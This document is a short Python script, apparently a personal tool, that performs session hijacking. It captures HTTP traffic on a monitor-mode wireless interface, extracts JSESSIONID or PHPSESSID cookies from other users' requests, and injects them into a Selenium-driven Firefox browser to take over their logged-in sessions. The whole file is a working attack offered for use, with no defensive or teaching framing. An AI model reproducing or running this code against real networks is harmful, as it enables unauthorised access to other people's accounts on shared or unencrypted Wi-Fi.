#!/usr/bin/env python3
# Paweł Rubin 2019
#
from typing import List

import pyshark
from selenium import webdriver


def parse_cookies(cookies: str) -> List[dict]:
    return [
        {"name": cookie[0], "value": cookie[1]}
        for cookie in [cookie.split("=") for cookie in cookies.split("; ")]
    ]


class SessionCookieNotFoundError(Exception):
    """Raised when http cookies do not contain session cookie."""


def get_session_cookie(cookies: str) -> dict:
    try:
        return next(
            cookie
            for cookie in parse_cookies(cookies)
            if cookie["name"] == "JSESSIONID" or cookie["name"] == "PHPSESSID"
        )
    except StopIteration:
        raise SessionCookieNotFoundError()


def hijack_session(interface):
    capture = pyshark.LiveCapture(
        interface=interface, display_filter="http.cookie || http.cookie_pair"
    )

    for packet in capture.sniff_continuously():
        try:
            base_url = packet.http.referer
            session_cookie = get_session_cookie(packet.http.cookie)
            browser = webdriver.Firefox()
            browser.get(base_url)
            browser.add_cookie(session_cookie)
            browser.refresh()
            break
        except (AttributeError, SessionCookieNotFoundError):
            continue


if __name__ == "__main__":
    hijack_session("wlan0mon")
